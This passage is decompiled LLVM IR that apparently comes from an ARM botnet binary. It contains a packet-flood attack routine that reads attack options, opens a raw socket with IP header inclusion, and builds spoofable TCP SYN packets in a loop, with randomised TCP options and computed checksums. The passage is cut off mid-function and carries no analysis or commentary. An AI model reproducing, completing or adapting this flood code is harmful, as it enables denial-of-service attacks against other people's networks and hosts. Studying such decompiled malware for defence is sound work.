  %v0_c36c = load i32, i32* @r4, align 4
  store i32 %v0_c36c, i32* %r0.global-to-local, align 4
  %v5_c370 = inttoptr i32 %v0_c35c to i32*
  %v6_c370 = call i32 @attack_get_opt_int(i32 %v0_c36c, i32* %v5_c370, i32 16, i32 0)
  %v2_c37c = load i32, i32* @global_var_243d4.57, align 4
  store i32 %v2_c37c, i32* %r3.global-to-local, align 4
  %v0_c380 = load i32, i32* @r5, align 4
  store i32 %v0_c380, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c388 = load i32, i32* @r4, align 4
  store i32 %v0_c388, i32* %r0.global-to-local, align 4
  %v5_c38c = inttoptr i32 %v0_c380 to i32*
  %v6_c38c = call i32 @attack_get_opt_ip(i32 %v0_c388, i32* %v5_c38c, i32 25, i32 %v2_c37c, i32 %v6_c370)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c3a0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c3a0, i32* %r0.global-to-local, align 4
  %v7_c3a4 = icmp eq i32 %v3_c3a0, -1
  store i1 %v7_c3a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c3a0, i32* @sl, align 4
  br i1 %v7_c3a4, label %dec_label_pc_c878, label %dec_label_pc_c3b0

dec_label_pc_c3b0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c3b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c3b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c3cc = call i32 @__GI_setsockopt(i32 %v3_c3a0, i32 0, i32 3, i32 %v6_c3b8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c3cc, i32* %r0.global-to-local, align 4
  %v7_c3d0 = icmp eq i32 %v5_c3cc, -1
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c870, label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3b0
  %v3_c3e0 = mul i32 %v7_c234, 65536
  store i32 %v3_c3e0, i32* %r0.global-to-local, align 4
  %v0_c3e4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c3e4 = mul i32 %v0_c3e4, 65536
  store i32 %v3_c3e4, i32* %r4.global-to-local, align 4
  %v0_c3e8 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c2f8, i32* %r2.global-to-local, align 4
  %v3_c3f4 = urem i32 %v7_c234, 65536
  store i32 %v3_c3f4, i32* %r3.global-to-local, align 4
  %v3_c3f8 = urem i32 %v0_c3e4, 65536
  %v3_c3fc = urem i32 %v0_c3e8, 65536
  store i32 %v3_c3fc, i32* %r1.global-to-local, align 4
  %v0_c400 = load i32, i32* @r7, align 4
  %v2_c400 = icmp eq i32 %v0_c400, 0
  store i1 %v2_c400, i1* %cpsr_z.global-to-local, align 1
  %v1_c410 = urem i32 %v6_c2f8, 256
  store i32 %v1_c410, i32* @fp, align 4
  br i1 %v2_c400, label %dec_label_pc_c664.preheader, label %dec_label_pc_c418

dec_label_pc_c418:                                ; preds = %dec_label_pc_c3d8
  %tmp52 = mul i32 %v5_c2c8, 256
  %v3_c430 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c234, 256
  %v3_c434 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c2c8, 256
  %v4_c43c = urem i32 %tmp54, 256
  %v5_c43c = or i32 %v4_c43c, %v3_c430
  store i32 %v5_c43c, i32* @lr, align 4
  %v1_c438 = mul i32 %v7_c234, 256
  %v4_c440 = and i32 %v1_c438, 65280
  %v5_c440 = or i32 %v4_c440, %v3_c434
  %tmp55 = mul i32 %v0_c3e4, 256
  %v3_c44c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c3e8, 256
  %v3_c450 = and i32 %tmp56, 65280
  %v1_c454 = urem i32 %v6_c2f8, 2
  %v1_c458 = urem i32 %v6_c310, 2
  %tmp57 = udiv i32 %v0_c3e4, 256
  %v4_c45c = urem i32 %tmp57, 256
  %v5_c45c = or i32 %v4_c45c, %v3_c44c
  store i32 %v5_c45c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c3e8, 256
  %v4_c460 = urem i32 %tmp58, 256
  %v5_c460 = or i32 %v4_c460, %v3_c450
  store i32 %v5_c460, i32* @r5, align 4
  %v1_c47c = urem i32 %v6_c328, 2
  store i32 %v1_c47c, i32* %r2.global-to-local, align 4
  %v1_c480 = urem i32 %v6_c340, 2
  store i32 %v1_c480, i32* %r3.global-to-local, align 4
  %v1_c484 = urem i32 %v6_c358, 2
  store i32 %v1_c484, i32* %r0.global-to-local, align 4
  %v1_c488 = urem i32 %v6_c370, 2
  store i32 %v1_c488, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c440, 65536
  %v4_c510 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c458
  %v4_c574 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c47c
  %v4_c588 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c480
  %v4_c5a0 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c484
  %v3_c5b4 = and i32 %tmp64, 2
  %v1_c504 = trunc i32 %v6_c24c to i8
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %bb61, %dec_label_pc_c418
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c4b0, i32* %r0.global-to-local, align 4
  %v3_c4b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c4b4, i32* %r2.global-to-local, align 4
  %v1_c4b8 = load i32, i32* @sb, align 4
  %v2_c4b8 = load i32, i32* @r4, align 4
  %v5_c4b8 = mul i32 %v2_c4b8, 4
  %v6_c4b8 = add i32 %v5_c4b8, %v1_c4b8
  %v7_c4b8 = inttoptr i32 %v6_c4b8 to i32*
  store i32 %v2_c4b0, i32* %v7_c4b8, align 4
  %v0_c4bc = load i32, i32* %r2.global-to-local, align 4
  %v3_c4bc = mul i32 %v0_c4bc, 32
  store i32 %v3_c4bc, i32* %r3.global-to-local, align 4
  %v0_c4c0 = load i32, i32* @sb, align 4
  %v4_c4c0 = mul i32 %v0_c4bc, 4
  %v5_c4c0 = add i32 %v0_c4c0, %v4_c4c0
  %v6_c4c0 = inttoptr i32 %v5_c4c0 to i32*
  %v7_c4c0 = load i32, i32* %v6_c4c0, align 4
  store i32 %v7_c4c0, i32* %r4.global-to-local, align 4
  %v5_c4c4 = mul i32 %v0_c4bc, 24
  store i32 %v5_c4c4, i32* %r3.global-to-local, align 4
  %v1_c4c8 = load i32, i32* @r8, align 4
  %v2_c4c8 = add i32 %v1_c4c8, %v5_c4c4
  store i32 %v2_c4c8, i32* %r0.global-to-local, align 4
  %v1_c4cc = inttoptr i32 %v7_c4c0 to i8*
  %v2_c4cc = load i8, i8* %v1_c4cc, align 1
  %tmp65 = urem i8 %v2_c4cc, 16
  %v1_c4d0 = zext i8 %tmp65 to i32
  %v1_c4d4 = or i32 %v1_c4d0, 64
  store i32 %v1_c4d4, i32* %r3.global-to-local, align 4
  %v1_c4d8 = trunc i32 %v1_c4d4 to i8
  store i8 %v1_c4d8, i8* %v1_c4cc, align 1
  %v0_c4dc = load i32, i32* %r4.global-to-local, align 4
  %v1_c4dc = inttoptr i32 %v0_c4dc to i8*
  %v2_c4dc = load i8, i8* %v1_c4dc, align 1
  %v1_c4e0 = and i8 %v2_c4dc, -16
  %v1_c4e4 = or i8 %v1_c4e0, 5
  store i32 %v1_c278, i32* %r3.global-to-local, align 4
  store i8 %v1_c4e4, i8* %v1_c4dc, align 1
  %v2_c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 1
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i8*
  store i8 %v5_c230, i8* %v4_c4f4, align 1
  store i32 %v1_c254, i32* %r2.global-to-local, align 4
  %v0_c4fc = load i32, i32* %r3.global-to-local, align 4
  %v2_c4fc = icmp eq i32 %v0_c4fc, 0
  store i1 %v2_c4fc, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c504 = load i32, i32* %r4.global-to-local, align 4
  %v3_c504 = add i32 %v2_c504, 8
  %v4_c504 = inttoptr i32 %v3_c504 to i8*
  store i8 %v1_c504, i8* %v4_c504, align 1
  %v0_c508 = load i32, i32* %r3.global-to-local, align 4
  %v1_c508 = trunc i32 %v0_c508 to i16
  %v2_c508 = load i32, i32* %r4.global-to-local, align 4
  %v3_c508 = add i32 %v2_c508, 2
  %v4_c508 = inttoptr i32 %v3_c508 to i16*
  store i16 %v1_c508, i16* %v4_c508, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c510, i32* %r1.global-to-local, align 4
  %v0_c514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c514, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c4a8
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c4a8, %bb
  %v2_c518 = load i32, i32* %r4.global-to-local, align 4
  %v3_c518 = add i32 %v2_c518, 9
  %v4_c518 = inttoptr i32 %v3_c518 to i8*
  store i8 6, i8* %v4_c518, align 1
  %v0_c51c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c51c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c51c = load i32, i32* %r2.global-to-local, align 4
  %v2_c51c = trunc i32 %v1_c51c to i16
  %v3_c51c = load i32, i32* %r4.global-to-local, align 4
  %v4_c51c = add i32 %v3_c51c, 6
  %v5_c51c = inttoptr i32 %v4_c51c to i16*
  store i16 %v2_c51c, i16* %v5_c51c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c38c, i32* %r2.global-to-local, align 4
  %v1_c524 = load i32, i32* %r4.global-to-local, align 4
  %v2_c524 = add i32 %v1_c524, 12
  %v3_c524 = inttoptr i32 %v2_c524 to i32*
  store i32 %v6_c38c, i32* %v3_c524, align 4
  %v0_c528 = load i32, i32* %r0.global-to-local, align 4
  %v1_c528 = add i32 %v0_c528, 16
  %v2_c528 = inttoptr i32 %v1_c528 to i32*
  %v3_c528 = load i32, i32* %v2_c528, align 4
  store i32 %v3_c528, i32* %r3.global-to-local, align 4
  %v0_c52c = load i32, i32* %r1.global-to-local, align 4
  %v1_c52c = trunc i32 %v0_c52c to i16
  %v2_c52c = load i32, i32* %r4.global-to-local, align 4
  %v3_c52c = add i32 %v2_c52c, 4
  %v4_c52c = inttoptr i32 %v3_c52c to i16*
  store i16 %v1_c52c, i16* %v4_c52c, align 2
  %v0_c530 = load i32, i32* %r3.global-to-local, align 4
  %v1_c530 = load i32, i32* %r4.global-to-local, align 4
  %v2_c530 = add i32 %v1_c530, 16
  %v3_c530 = inttoptr i32 %v2_c530 to i32*
  store i32 %v0_c530, i32* %v3_c530, align 4
  %v0_c534 = load i32, i32* @r6, align 4
  %v1_c534 = trunc i32 %v0_c534 to i16
  %v2_c534 = load i32, i32* %r4.global-to-local, align 4
  %v3_c534 = add i32 %v2_c534, 20
  %v4_c534 = inttoptr i32 %v3_c534 to i16*
  store i16 %v1_c534, i16* %v4_c534, align 2
  %v0_c538 = load i32, i32* %r4.global-to-local, align 4
  %v1_c538 = add i32 %v0_c538, 20
  store i32 %v1_c538, i32* %r1.global-to-local, align 4
  %v1_c53c = add i32 %v0_c538, 32
  %v2_c53c = inttoptr i32 %v1_c53c to i8*
  %v3_c53c = load i8, i8* %v2_c53c, align 1
  %v4_c53c = zext i8 %v3_c53c to i32
  store i32 %v4_c53c, i32* %r3.global-to-local, align 4
  %v1_c540 = add i32 %v0_c538, 33
  %v2_c540 = inttoptr i32 %v1_c540 to i8*
  %v3_c540 = load i8, i8* %v2_c540, align 1
  %v4_c540 = zext i8 %v3_c540 to i32
  store i32 %v1_c454, i32* %r0.global-to-local, align 4
  %v1_c548 = urem i8 %v3_c53c, 16
  %v1_c54c = or i8 %v1_c548, -96
  %v1_c550 = and i32 %v4_c540, 223
  store i32 %v1_c550, i32* %r2.global-to-local, align 4
  store i8 %v1_c54c, i8* %v2_c53c, align 1
  %v0_c558 = load i32, i32* %r2.global-to-local, align 4
  %v1_c558 = load i32, i32* %r0.global-to-local, align 4
  %v4_c558 = mul i32 %v1_c558, 32
  %v5_c558 = or i32 %v4_c558, %v0_c558
  store i32 %v5_c558, i32* %r2.global-to-local, align 4
  store i32 %v5_c43c, i32* %r3.global-to-local, align 4
  %v1_c560 = trunc i32 %v5_c558 to i8
  %v2_c560 = load i32, i32* %r1.global-to-local, align 4
  %v3_c560 = add i32 %v2_c560, 13
  %v4_c560 = inttoptr i32 %v3_c560 to i8*
  store i8 %v1_c560, i8* %v4_c560, align 1
  %v0_c564 = load i32, i32* %r3.global-to-local, align 4
  %v1_c564 = load i32, i32* %r1.global-to-local, align 4
  %v2_c564 = add i32 %v1_c564, 4
  %v3_c564 = inttoptr i32 %v2_c564 to i32*
  store i32 %v0_c564, i32* %v3_c564, align 4
  %v0_c568 = load i32, i32* %r1.global-to-local, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c458, i32* %r0.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 239
  %v5_c574 = or i32 %v1_c570, %v4_c574
  store i32 %v5_c574, i32* %r3.global-to-local, align 4
  %v1_c578 = trunc i32 %v5_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* %r1.global-to-local, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c47c, i32* %r3.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 247
  %v5_c588 = or i32 %v1_c584, %v4_c588
  store i32 %v5_c588, i32* %r2.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  %v1_c58c = trunc i32 %v0_c58c to i16
  %v3_c58c = add i32 %v0_c57c, 2
  %v4_c58c = inttoptr i32 %v3_c58c to i16*
  store i16 %v1_c58c, i16* %v4_c58c, align 2
  %v0_c590 = load i32, i32* %r2.global-to-local, align 4
  %v1_c590 = trunc i32 %v0_c590 to i8
  %v2_c590 = load i32, i32* %r1.global-to-local, align 4
  %v3_c590 = add i32 %v2_c590, 13
  %v4_c590 = inttoptr i32 %v3_c590 to i8*
  store i8 %v1_c590, i8* %v4_c590, align 1
  %v0_c594 = load i32, i32* %r1.global-to-local, align 4
  %v1_c594 = add i32 %v0_c594, 13
  %v2_c594 = inttoptr i32 %v1_c594 to i8*
  %v3_c594 = load i8, i8* %v2_c594, align 1
  %v4_c594 = zext i8 %v3_c594 to i32
  store i32 %v1_c480, i32* %r0.global-to-local, align 4
  %v1_c59c = and i32 %v4_c594, 251
  %v5_c5a0 = or i32 %v1_c59c, %v4_c5a0
  store i32 %v5_c5a0, i32* %r3.global-to-local, align 4
  %v1_c5a4 = trunc i32 %v5_c5a0 to i8
  store i8 %v1_c5a4, i8* %v2_c594, align 1
  %v0_c5a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5a8 = add i32 %v0_c5a8, 13
  %v2_c5a8 = inttoptr i32 %v1_c5a8 to i8*
  %v3_c5a8 = load i8, i8* %v2_c5a8, align 1
  %v4_c5a8 = zext i8 %v3_c5a8 to i32
  store i32 %v1_c484, i32* %r3.global-to-local, align 4
  %v1_c5b0 = and i32 %v4_c5a8, 253
  %v4_c5b4 = or i32 %v1_c5b0, %v3_c5b4
  store i32 %v4_c5b4, i32* %r2.global-to-local, align 4
  %v1_c5b8 = trunc i32 %v4_c5b4 to i8
  store i8 %v1_c5b8, i8* %v2_c5a8, align 1
  %v0_c5bc = load i32, i32* %r1.global-to-local, align 4
  %v1_c5bc = add i32 %v0_c5bc, 13
  %v2_c5bc = inttoptr i32 %v1_c5bc to i8*
  %v3_c5bc = load i8, i8* %v2_c5bc, align 1
  %v4_c5bc = zext i8 %v3_c5bc to i32
  store i32 %v1_c488, i32* %r0.global-to-local, align 4
  %v1_c5c4 = and i32 %v4_c5bc, 254
  %v2_c5c8 = or i32 %v1_c5c4, %v1_c488
  store i32 %v2_c5c8, i32* %r3.global-to-local, align 4
  %v1_c5cc = trunc i32 %v2_c5c8 to i8
  store i8 %v1_c5cc, i8* %v2_c5bc, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c5d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 40
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 2, i8* %v4_c5d8, align 1
  %v0_c5dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5dc = trunc i32 %v0_c5dc to i8
  %v2_c5dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5dc = add i32 %v2_c5dc, 41
  %v4_c5dc = inttoptr i32 %v3_c5dc to i8*
  store i8 %v1_c5dc, i8* %v4_c5dc, align 1
  %v0_c5e0 = call i32 @rand_next()
  %v1_c5e4 = urem i32 %v0_c5e0, 16
  %v1_c5e8 = or i32 %v1_c5e4, 1392
  %tmp66 = mul nuw nsw i32 %v1_c5e8, 256
  %v3_c5f4 = add nuw nsw i32 %tmp66, 2048
  %v5_c5fc = or i32 %v3_c5f4, 5
  %v1_c600 = trunc i32 %v5_c5fc to i16
  %v2_c600 = load i32, i32* %r4.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 42
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v2_c608 = load i32, i32* %r4.global-to-local, align 4
  %v3_c608 = add i32 %v2_c608, 44
  %v4_c608 = inttoptr i32 %v3_c608 to i8*
  store i8 4, i8* %v4_c608, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c618 = load i32, i32* %r4.global-to-local, align 4
  %v3_c618 = add i32 %v2_c618, 46
  %v4_c618 = inttoptr i32 %v3_c618 to i8*
  store i8 8, i8* %v4_c618, align 1
  %v0_c61c = load i32, i32* %r2.global-to-local, align 4
  %v1_c61c = trunc i32 %v0_c61c to i8
  %v2_c61c = load i32, i32* %r4.global-to-local, align 4
  %v3_c61c = add i32 %v2_c61c, 47
  %v4_c61c = inttoptr i32 %v3_c61c to i8*
  store i8 %v1_c61c, i8* %v4_c61c, align 1
  %v0_c620 = load i32, i32* %r0.global-to-local, align 4
  %v1_c620 = trunc i32 %v0_c620 to i8
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 45
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v1_c620, i8* %v4_c620, align 1
  %v0_c624 = call i32 @rand_next()
  store i32 %v0_c624, i32* %r0.global-to-local, align 4
  %v2_c62c = load i32, i32* %r4.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 59
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 6, i8* %v4_c62c, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c63c = load i32, i32* %r4.global-to-local, align 4
  %v2_c63c = add i32 %v1_c63c, 48
  %v3_c63c = inttoptr i32 %v2_c63c to i32*
  store i32 %v0_c624, i32* %v3_c63c, align 4
  %v0_c640 = load i32, i32* %r3.global-to-local, align 4
  %v1_c640 = load i32, i32* %r4.global-to-local, align 4
  %v2_c640 = add i32 %v1_c640, 52
  %v3_c640 = inttoptr i32 %v2_c640 to i32*
  store i32 %v0_c640, i32* %v3_c640, align 4
  %v0_c644 = load i32, i32* %r2.global-to-local, align 4
  %v1_c644 = trunc i32 %v0_c644 to i8
  %v2_c644 = load i32, i32* %r4.global-to-local, align 4
  %v3_c644 = add i32 %v2_c644, 56
  %v4_c644 = inttoptr i32 %v3_c644 to i8*
  store i8 %v1_c644, i8* %v4_c644, align 1
  %v0_c648 = load i32, i32* %r1.global-to-local, align 4
  %v1_c648 = trunc i32 %v0_c648 to i8
  %v2_c648 = load i32, i32* %r4.global-to-local, align 4
  %v3_c648 = add i32 %v2_c648, 58
  %v4_c648 = inttoptr i32 %v3_c648 to i8*
  store i8 %v1_c648, i8* %v4_c648, align 1
  %v0_c64c = load i32, i32* %r1.global-to-local, align 4
  %v1_c64c = trunc i32 %v0_c64c to i8
  %v2_c64c = load i32, i32* %r4.global-to-local, align 4
  %v3_c64c = add i32 %v2_c64c, 57
  %v4_c64c = inttoptr i32 %v3_c64c to i8*
  store i8 %v1_c64c, i8* %v4_c64c, align 1
  %v3_c650 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = load i32, i32* %r2.global-to-local, align 4
  %v2_c654 = add i32 %v1_c654, %v3_c650
  store i32 %v2_c654, i32* @r4, align 4
  %v1_c658 = load i32, i32* @r7, align 4
  %v9_c658 = icmp eq i32 %v2_c654, %v1_c658
  store i1 %v9_c658, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c654, i32* %stack_var_-44, align 4
  %v5_c660 = icmp slt i32 %v2_c654, %v1_c658
  br i1 %v5_c660, label %dec_label_pc_c4a8, label %dec_label_pc_c664.preheader

dec_label_pc_c664.preheader:                      ; preds = %bb61, %dec_label_pc_c3d8
  %v0_c6686 = phi i32 [ 0, %dec_label_pc_c3d8 ], [ %v1_c658, %bb61 ]
  %v3_c7e0 = icmp eq i32 %v6_c38c, -1
  %v8_c7e0 = icmp eq i32 %v6_c38c, -1
  %v3_c6b0 = icmp eq i32 %v3_c3f4, 65535
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774, %dec_label_pc_c664.preheader
  %v0_c668 = phi i32 [ %v0_c6686, %dec_label_pc_c664.preheader ], [ 0, %dec_label_pc_c774 ], [ 0, %dec_label_pc_c664 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c668 = icmp eq i32 %v0_c668, 0
  store i1 %v2_c668, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c668, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c6f0, %dec_label_pc_c674
  %v1_c688 = phi i32 [ %v1_c764, %dec_label_pc_c6f0 ], [ 0, %dec_label_pc_c674 ]
  %v5_c67c = mul i32 %v1_c688, 24
  %v1_c680 = load i32, i32* @r8, align 4
  %v2_c680 = add i32 %v1_c680, %v5_c67c
  store i32 %v2_c680, i32* %r3.global-to-local, align 4
  %v1_c684 = add i32 %v2_c680, 20
  %v2_c684 = inttoptr i32 %v1_c684 to i8*
  %v3_c684 = load i8, i8* %v2_c684, align 1
  %v4_c684 = zext i8 %v3_c684 to i32
  store i32 %v4_c684, i32* %r2.global-to-local, align 4
  %v0_c688 = load i32, i32* @sb, align 4
  %v4_c688 = mul i32 %v1_c688, 4
  %v5_c688 = add i32 %v0_c688, %v4_c688
  %v6_c688 = inttoptr i32 %v5_c688 to i32*
  %v7_c688 = load i32, i32* %v6_c688, align 4
  store i32 %v7_c688, i32* @r5, align 4
  %v7_c68c = icmp eq i8 %v3_c684, 31
  store i1 %v7_c68c, i1* %cpsr_z.global-to-local, align 1
  %v1_c690 = add i32 %v7_c688, 20
  store i32 %v1_c690, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c684, 32
  br i1 %tmp67, label %dec_label_pc_c788, label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c678
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c6a4:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6b0, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v1_c6bc = phi i32 [ %v1_c7f8, %dec_label_pc_c7e8 ], [ 65535, %dec_label_pc_c6a4 ]
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v9_c6bc = icmp eq i32 %v3_c3f8, %v1_c6bc
  store i1 %v9_c6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6bc, label %dec_label_pc_c818, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge, %dec_label_pc_c6b8
  %v1_c6c8 = phi i32 [ %v1_c6c8.pre, %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge ], [ %v1_c6bc, %dec_label_pc_c6b8 ]
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v9_c6c8 = icmp eq i32 %v3_c3fc, %v1_c6c8
  store i1 %v9_c6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6c8, label %dec_label_pc_c82c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge, %dec_label_pc_c6c4
  %v1_c6d4 = phi i32 [ %v1_c6d4.pre, %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge ], [ %v1_c6c8, %dec_label_pc_c6c4 ]
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v5_c2c8, %v1_c6d4
  store i1 %v9_c6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6d4, label %dec_label_pc_c840, label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge, %dec_label_pc_c6d0
  %v1_c6e0 = phi i32 [ %v1_c6e0.pre, %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge ], [ %v1_c6d4, %dec_label_pc_c6d0 ]
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v9_c6e0 = icmp eq i32 %v6_c2e0, %v1_c6e0
  store i1 %v9_c6e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6e0, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c6e8 = load i32, i32* @fp, align 4
  %v2_c6e8 = icmp eq i32 %v0_c6e8, 0
  store i1 %v2_c6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6e8, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854, %dec_label_pc_c864
  %v2_c6f4 = load i32, i32* @r5, align 4
  %v3_c6f4 = add i32 %v2_c6f4, 10
  %v4_c6f4 = inttoptr i32 %v3_c6f4 to i16*
  store i16 0, i16* %v4_c6f4, align 2
  %v0_c6f8 = load i32, i32* @r5, align 4
  store i32 %v0_c6f8, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c700 = call i32 @checksum_generic(i32 %v0_c6f8, i32 20)
  %v3_c700 = trunc i32 %v2_c700 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c708 = load i32, i32* @r5, align 4
  %v4_c708 = add i32 %v3_c708, 10
  %v5_c708 = inttoptr i32 %v4_c708 to i16*
  store i16 %v3_c700, i16* %v5_c708, align 2
  %v0_c70c = load i32, i32* @r6, align 4
  store i32 %v0_c70c, i32* @r1, align 4
  %v0_c710 = load i32, i32* %r2.global-to-local, align 4
  %v1_c710 = trunc i32 %v0_c710 to i16
  %v3_c710 = add i32 %v0_c70c, 16
  %v4_c710 = inttoptr i32 %v3_c710 to i16*
  store i16 %v1_c710, i16* %v4_c710, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c71c = load i32, i32* @r5, align 4
  store i32 %v0_c71c, i32* %r0.global-to-local, align 4
  %v4_c720 = call i32 @checksum_tcpudp(i32 %v0_c71c, i32 %v0_c70c, i32 10240, i32 40)
  %v5_c720 = trunc i32 %v4_c720 to i16
  store i32 %v4_c720, i32* %r0.global-to-local, align 4
  %v3_c724 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c724, i32* %r3.global-to-local, align 4
  %v3_c728 = mul i32 %v3_c724, 32
